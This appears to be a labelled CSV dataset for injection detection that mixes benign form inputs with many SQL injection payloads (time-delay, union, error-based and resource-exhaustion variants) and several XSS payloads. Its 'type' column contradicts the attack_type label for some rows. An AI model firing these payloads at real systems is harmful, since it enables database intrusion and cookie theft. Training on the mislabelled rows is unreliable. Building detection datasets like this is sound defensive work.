Text,attack_type,Label,type
5828720454408977,norm,0,normal
"cuesta sagrado corazon, 155 5?a",norm,0,normal
de$lictivo,norm,0,normal
nicastro,norm,0,normal
70075138a,norm,0,normal
"1"") as ebvt where 5305=5305;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
"1%"")));waitfor delay '0:0:5' and (((""%""=""",sqli,1,sql
mirel-duvitski@pavimentosalagon.sr,norm,0,normal
borzani jordan,norm,0,normal
5he1un,norm,0,normal
tejeda,norm,0,normal
bertorelli,norm,0,normal
belito cedeo,norm,0,normal
67sm1met93,norm,0,normal
26222,norm,0,normal
jabir,norm,0,normal
1) as vbli where 5139=5139 and 2782=2625--,sqli,1,sql
1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
espejn,norm,0,normal
halford,norm,0,normal
"-5391 or make_set(9354=9354,7185)# ptyy",sqli,1,normal
ashida@gaudio.my,norm,0,normal
8772381547327931,norm,0,normal
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma",sqli,1,sql
"plaza de san isidro 45,",norm,0,normal
tainsy@jaxiaabogadosyeconomistas.je,norm,0,normal
4347,norm,0,normal
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
hervs,norm,0,normal
"-4091""))) union all select 6694,6694--",sqli,1,sql
"1"" where 5372=5372 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
-9446)) as wmrq where 3705=3705 union all select 3705#,sqli,1,sql
-3088' or 6872=6872 and 'miwk'='miwk,sqli,1,normal
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1%')));select * from generate_series(5206,5206,case when (5206=2214) then 1 else 0 end) limit 1--",sqli,1,sql
"1'||(select 'nzjz' where 3539=3539 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
calle liebre 195,norm,0,normal
"elt(5953=5953,1)",sqli,1,normal
bolado pellicer,norm,0,normal
5107,norm,0,normal
in5rover88,norm,0,normal
39643208v,norm,0,normal
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",sqli,1,sql
71579092x,norm,0,normal
"-6639') as trll where 6271=6271 union all select 6271,6271,6271#",sqli,1,sql
faimunda,norm,0,normal
valentini funosa,norm,0,normal
"1)) union all select null,null,null#",sqli,1,sql
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,sqli,1,sql
extremosa,norm,0,normal
"c/ el jacinto, 132,",norm,0,normal
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,sqli,1,sql
"1"") waitfor delay '0:0:5'--",sqli,1,sql
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('gxpr'='gxpr",sqli,1,normal
6742076773015534,norm,0,normal
giulivo padilla,norm,0,normal
3690,norm,0,normal
"c/ poeta bernardo de la torre 10,",norm,0,normal
"""><script>alert('xssya')</script>",xss,2,xss
knute,norm,0,normal
22001,norm,0,normal
6913071576619939,norm,0,normal
26288,norm,0,normal
"1' in boolean mode) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))#",sqli,1,sql
"1"") as ifgl where 2190=2190 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli,1,sql
6010330300063048,norm,0,normal
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",sqli,1,sql
"-3349))) union all select 6553,6553#",sqli,1,sql
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('cssb'='cssb",sqli,1,normal
"1%') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('%'='",sqli,1,sql
gilan@escarba.fk,norm,0,normal
calle juan de dios montaes s/n,norm,0,normal
"-9531'))) union all select 4076,4076#",sqli,1,sql
juifen5,norm,0,normal
"1'||(select 'nvrq' from dual where 4337=4337 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
dominguez@comercioenlacalle.hn,norm,0,normal
holdaway,norm,0,normal
watts@viajesnacionales.na,norm,0,normal
"1%'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
menju,norm,0,normal
"1%'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('%'='",sqli,1,normal
estellesa,norm,0,normal
50259,norm,0,normal
c96reveidil5,norm,0,normal
drabek,norm,0,normal
bienvenido,norm,0,normal
tierra 17,norm,0,normal
eberto,norm,0,normal
17726743e,norm,0,normal
krug sabet,norm,0,normal
riega girme,norm,0,normal
"1""))) and sleep(5) and (((""fdvc"" like ""fdvc",sqli,1,normal
cos6rio,norm,0,normal
1621765359998786,norm,0,normal
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",sqli,1,sql
anabaptismo,norm,0,normal
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",sqli,1,sql
linden,norm,0,normal
"c/ pedro hidalgo, 137, 9?g",norm,0,normal
"1')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"charca verde 165,",norm,0,normal
"-4728"")) as ndri where 3278=3278 or make_set(9354=9354,7185)--",sqli,1,sql
"1) where 9149=9149 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,sqli,1,sql
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""ftjg""=""ftjg",sqli,1,sql
solanillos del extremo,norm,0,normal
alonso,norm,0,normal
9828593749535082,norm,0,normal
pas63a0a,norm,0,normal
"-9087"" order by 1#",sqli,1,normal
"saavedra fajardo s/n, 3-h",norm,0,normal
73t4h5mbre4,norm,0,normal
qwerty,norm,0,normal
castiglioni@hiperbilbao.nl,norm,0,normal
"1"") where 2702=2702 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
cang,norm,0,normal
medina de rioseco,norm,0,normal
"1%') and elt(4670=9403,9403) and ('%'='",sqli,1,normal
96to3a38,norm,0,normal
alcahazar,norm,0,normal
"1',(case when 5204=2136 then 1 else null end)",sqli,1,normal
argelita,norm,0,normal
dosenbac,norm,0,normal
axman@culturalsanpedrocf.ie,norm,0,normal
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",sqli,1,sql
1';begin dbms_lock.sleep(5); end and 'aenf'='aenf,sqli,1,sql
boquieni,norm,0,normal
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",sqli,1,sql
papandujo,norm,0,normal
hidrobo,norm,0,normal
1') rlike (select * from (select(sleep(5)))sgvo),sqli,1,sql
0420136145543852,norm,0,normal
bascuana de san pedro,norm,0,normal
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru",sqli,1,sql
heal@quadernideilgarda.gob,norm,0,normal
altavista@hojainformativa.com.tz,norm,0,normal
2j2st1,norm,0,normal
39960501w,norm,0,normal
angelle,norm,0,normal
"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
mouchet@007tv.fj,norm,0,normal
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# msrb",sqli,1,sql
sab644sa,norm,0,normal
nardo,norm,0,normal
1' in boolean mode);select (case when (4306=2815) then 4306 else 1/(select 0) end)--,sqli,1,sql
huffman@tobarisch.tt,norm,0,normal
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
"-6492') union all select 7204,7204--",sqli,1,sql
0ocal2za0i3n,norm,0,normal
!and5ajoso,norm,0,normal
atanaspulos,norm,0,normal
waller,norm,0,normal
70289546m,norm,0,normal
skolnik-daye@joll.ws,norm,0,normal
"-9808' in boolean mode) union all select 2528,2528,2528,2528,2528,2528,2528--",sqli,1,sql
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('qbdm'='qbdm",sqli,1,sql
28867747x,norm,0,normal
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""fvtu"" like ""fvtu",sqli,1,normal
"1) union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
45100,norm,0,normal
"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",xss,2,sql
"1)) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
presbiteriano,norm,0,normal
3496372127518635,norm,0,normal
5v1s582a,norm,0,normal
wiele,norm,0,normal
6_ocin,norm,0,normal
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""fpwu"" like ""fpwu",sqli,1,normal
aldeamayor de san martn,norm,0,normal
drozdek.waechter@tarifasdevuelos.bj,norm,0,normal
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
estalell,norm,0,normal
1')) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'gzlz' like 'gzlz",sqli,1,sql
17,norm,0,normal
villaralto,norm,0,normal
45935212a,norm,0,normal
"san roman 140, 2e",norm,0,normal
19227,norm,0,normal
reski.kuberskaya@n340magazin.no,norm,0,normal
34338,norm,0,normal
"calle venus, 81 2-a",norm,0,normal
di lorenzo,norm,0,normal
00903443a,norm,0,normal
contreras,norm,0,normal
1')) union all select null#,sqli,1,sql
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1,normal
1' and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
ugartechea oviol,norm,0,normal
"camino del caliero, 75",norm,0,normal
6135315526614967,norm,0,normal
99745017c,norm,0,normal
berba.andreguy4@campanasextractoras.sh,norm,0,normal
urrupan moger,norm,0,normal
e7c5c1da,norm,0,normal
0731466925802277,norm,0,normal
"-5124'+(select 'xpww' where 1752=1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",sqli,1,sql
"calle florian de ocampo 114, 7?h",norm,0,normal
"1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"<img src=""javascript:document.cookie=true;"">",xss,2,xss
"-8186%' or elt(1032=1032,3623) and '%'='",sqli,1,normal
"1))) union all select null,null,null,null#",sqli,1,sql
0957221958877630,norm,0,normal
parola@zonamodelos.pl,norm,0,normal
"1') where 4683=4683 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",sqli,1,sql
bernaden,norm,0,normal
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('yaim'='yaim,sqli,1,sql
domine,norm,0,normal
7106,norm,0,normal
ola,norm,0,normal
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
valdebenito garabana,norm,0,normal
henche,norm,0,normal
1) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (3530=3530,sqli,1,sql
7751,norm,0,normal
"1%""));(select * from (select(sleep(5)))acdk)#",sqli,1,sql
barruecopardo,norm,0,normal
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",sqli,1,sql
"-7041""))) union all select 2159,2159,2159,2159,2159--",sqli,1,sql
trgono,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
1'+(select 'mquh' where 3933=3933;select case when 1613=2937 then 1 else null end--,sqli,1,sql
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr",sqli,1,sql
5418155062739294,norm,0,normal
leanne,norm,0,normal
85009634r,norm,0,normal
"capmany, 94 4?e",norm,0,normal
pannequin@repretexbcn.gl,norm,0,normal
1'+(select ijoh where 7145=7145 order by 1--,sqli,1,sql
chilel,norm,0,normal
jackley@engibraltar.com.nu,norm,0,normal
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
13504152r,norm,0,normal
sergyl@intercambiodeenlaces.gh,norm,0,normal
2563,norm,0,normal
tomkin,norm,0,normal
ezequiel,norm,0,normal
delvische@softstylestudio.ly,norm,0,normal
"1"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""alkz""=""alkz",sqli,1,normal
"-2782"" union all select 2109,2109,2109#",sqli,1,sql
"1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",sqli,1,sql
36815dat1ra,norm,0,normal
filicidio,norm,0,normal
-4557%')) or 4537=3401 and (('%'=',sqli,1,normal
1840,norm,0,normal
rupit i pruit,norm,0,normal
"1)) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",sqli,1,sql
40984940k,norm,0,normal
1%' or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykoz'='ykoz",sqli,1,sql
abell segarras,norm,0,normal
1'||(select 'glyc' from dual where 4058=4058;(select * from (select(sleep(5)))srmq))||',sqli,1,sql
"1"";select case when 1238=9044 then 1 else null end--",sqli,1,sql
"1%"") union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-7001'+(select slav where 9321=9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",sqli,1,sql
elisha,norm,0,normal
-8538%' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and '%'=',sqli,1,sql
soms gallaga,norm,0,normal
"1"") as ltoa where 9159=9159 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1,sql
73ngazo,norm,0,normal
ortigas huerta,norm,0,normal
rayner,norm,0,normal
1))) and sleep(5)#,sqli,1,normal
noya driu,norm,0,normal
"-4305) as ldrt where 2567=2567 union all select 2567,2567,2567,2567,2567,2567,2567#",sqli,1,sql
benedit ferrandi,norm,0,normal
10460,norm,0,normal
9978092999259297,norm,0,normal
-3861') as zmja where 4036=4036 or 9323=9323#,sqli,1,normal
san vicente del raspeig/sant vicent del raspeig,norm,0,normal
"-7715') union all select 4830,4830,4830,4830,4830,4830,4830,4830--",sqli,1,sql
"$,_=1}}).$=alert</script>",xss,2,xss
hartford,norm,0,normal
"-5959"" or 2477=1144",sqli,1,normal
"1'||(select 'qjwf' from dual where 3187=3187 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",sqli,1,sql
"1"" and elt(4249=4249,7259)",sqli,1,normal
timb44,norm,0,normal
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,sqli,1,sql
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",sqli,1,sql
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('diyb' like 'diyb,sqli,1,sql
34406,norm,0,normal
0957098737909112,norm,0,normal
4908217523018940,norm,0,normal
uhlhorn,norm,0,normal
">""<img src=""blah>"" onmouseover=""document.cookie=true;"">",xss,2,sql
radresa tudn,norm,0,normal
manchita,norm,0,normal
32452,norm,0,normal
scott,norm,0,normal
"1%"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
96312323f,norm,0,normal
1) where 3381=3381;select pg_sleep(5)--,sqli,1,sql
4364,norm,0,normal
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""",sqli,1,sql
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",sqli,1,sql
bollullos de la mitacin,norm,0,normal
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
"1""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""ksxz""=""ksxz",sqli,1,sql
c/ alcazalquivir s/n,norm,0,normal
sidonio,norm,0,normal
gotern,norm,0,normal
nishio@granbretana.com.ml,norm,0,normal
estamariu,norm,0,normal
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",sqli,1,sql
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
oa,norm,0,normal
"-7412"") as qngt where 2041=2041 union all select 2041--",sqli,1,sql
sudip,norm,0,normal
"c/ guardia civil, 90,",norm,0,normal
ea,norm,0,normal
60537126e,norm,0,normal
1804467528403939,norm,0,normal
3141141898028856,norm,0,normal
steele,norm,0,normal
1) and sleep(5) and (4855=4855,sqli,1,normal
33300,norm,0,normal
-4892%')) or 2251=9881--,sqli,1,sql
franklin,norm,0,normal
ferrandez cabaas,norm,0,normal
"1' where 8864=8864;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)# tsxs",sqli,1,normal
"1') and make_set(6488=5525,5525)",sqli,1,normal
arajol lo cascio,norm,0,normal
9786890057742572,norm,0,normal
15lo956i1o,norm,0,normal
"1%"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1,sql
17534,norm,0,normal
kishida@fruteriacartaya.gm,norm,0,normal
villalba de la loma,norm,0,normal
"-7296%'))) union all select 9322,9322,9322,9322--",sqli,1,sql
ban_quera,norm,0,normal
brana@housemovie.id,norm,0,normal
isel,norm,0,normal
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
baltasar,norm,0,normal
26135,norm,0,normal
"c/ secretario guedes aleman s/n,",norm,0,normal
sitiwet-chagas@creacionesacampada.travel,norm,0,normal
10836981w,norm,0,normal
"1"")));(select * from (select(sleep(5)))acdk)#",sqli,1,sql
riudellots de la selva,norm,0,normal
deforeit,norm,0,normal
maurici garrudo,norm,0,normal
"1 where 4940=4940;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1,sql
2331,norm,0,normal
8622247853302054,norm,0,normal
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",sqli,1,sql
walpole@magentalgtb.zw,norm,0,normal
85766213h,norm,0,normal
"1 or 8421=(select count(*) from generate_series(1,5000000))# jmki",sqli,1,sql
41710,norm,0,normal
hiss@ajuntamentdebarcelona20.yu,norm,0,normal
anafrodita,norm,0,normal
"1"")) as aamh where 7432=7432 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1,sql
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
filemn,norm,0,normal
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'dphz'='dphz",sqli,1,sql
alarcon@24htranslations.cr,norm,0,normal
6113595872626667,norm,0,normal
ost91ma,norm,0,normal
ibero saborit,norm,0,normal
manda,norm,0,normal
kingston@professionalhost.com.ag,norm,0,normal
2325,norm,0,normal
18178277c,norm,0,normal
8424,norm,0,normal
2mpav8nar,norm,0,normal
aa,norm,0,normal
loria,norm,0,normal
5601692673189337,norm,0,normal
94987112x,norm,0,normal
9091453994786923,norm,0,normal
mccreano,norm,0,normal
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",sqli,1,sql
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'blie'='blie",sqli,1,sql
37427,norm,0,normal
9051495468288465,norm,0,normal
"calle pare joaquim roig s.f. s/n, 2?f",norm,0,normal
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",sqli,1,normal
17850,norm,0,normal
"calle muelles 57, 10?d",norm,0,normal
caspar,norm,0,normal
"-7845' union all select 9574,9574,9574,9574,9574,9574#",sqli,1,sql
"1%""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,1,sql
"josep guix i llado, 89 2-d",norm,0,normal
"1"" where 9230=9230;(select * from (select(sleep(5)))srmq)--",sqli,1,sql
0518984611180264,norm,0,normal
1) or sleep(5),sqli,1,normal
50159319e,norm,0,normal
peraferr,norm,0,normal
shiley,norm,0,normal
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"1%"")) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
loralie,norm,0,normal
fluvia,norm,0,normal
"1"") as cfed where 8220=8220 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('qeet'='qeet",sqli,1,sql
gillin-kinchelow@fotoseroticas.com.gr,norm,0,normal
clever,norm,0,normal
-4961') or 3038=3038,sqli,1,normal
"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",sqli,1,sql
34475,norm,0,normal
06927,norm,0,normal
"1"") where 4567=4567 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
fregaci5n,norm,0,normal
9448,norm,0,normal
co0313c2b67632ad,norm,0,normal
16802646l,norm,0,normal
"<bgsound src=""javascript:alert('crosssitescripting');"">",xss,2,xss
73,norm,0,normal
-9331' or (4519=2912)*2912 and 'rddk'='rddk,sqli,1,normal
583opi4,norm,0,normal
"1%"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""",sqli,1,sql
"1) as kaew where 2658=2658;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
8511359548446745,norm,0,normal
15256,norm,0,normal
<svg><script>alert(/1/)</script>,xss,2,xss
"-4954%"") or 5244=4832",sqli,1,normal
"grupos coronel ruiz de toledo 121, 9g",norm,0,normal
16670,norm,0,normal
<script>a=/xss/,xss,2,xss
villarrasa,norm,0,normal
histri985ent0,norm,0,normal
"""x""><img onerror=""alert(1)""></picture>",xss,2,xss
biosca,norm,0,normal
"1')) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
chrysa2,norm,0,normal
-8264%') order by 1#,sqli,1,normal
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
1';waitfor delay '0:0:5' and 'dfzn'='dfzn,sqli,1,sql
7201,norm,0,normal
gor,norm,0,normal
"1' where 5230=5230;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
kamber@weat.gd,norm,0,normal
1%') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',sqli,1,sql
zicheng,norm,0,normal
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",sqli,1,sql
"-6440))) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",sqli,1,sql
1446991809597037,norm,0,normal
dollie,norm,0,normal
1'||(select 'zccb' from dual where 8911=8911;waitfor delay '0:0:5'--,sqli,1,sql
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
"1) where 2543=2543;iif(2205=4764,1,1/0)",sqli,1,sql
innova5miento,norm,0,normal
-5555)) as ldte where 4583=4583 order by 1#,sqli,1,normal
ceferina,norm,0,normal
maybelle9,norm,0,normal
8e3i2ar,norm,0,normal
8043015940180984,norm,0,normal
ar4f30a,norm,0,normal
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",sqli,1,sql
